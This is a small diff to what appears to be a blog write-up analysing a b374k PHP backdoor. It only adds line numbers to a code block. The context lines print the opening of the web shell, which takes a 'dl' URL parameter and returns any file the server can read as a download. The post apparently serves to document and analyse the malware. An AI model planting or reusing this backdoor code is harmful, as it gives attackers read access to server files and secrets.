@@ -17,7 +17,7 @@ This looks like another b374k shell.
 
 ### b374k Backdoor Script Source Code
 
-{% highlight php %}<?php if (isset($_GET['dl']) && ($_GET['dl'] != "")) {
+{% highlight php linenos %}<?php if (isset($_GET['dl']) && ($_GET['dl'] != "")) {
     $file = $_GET['dl'];
     $filez = @file_get_contents($file);
     header("Content-type: application/octet-stream");
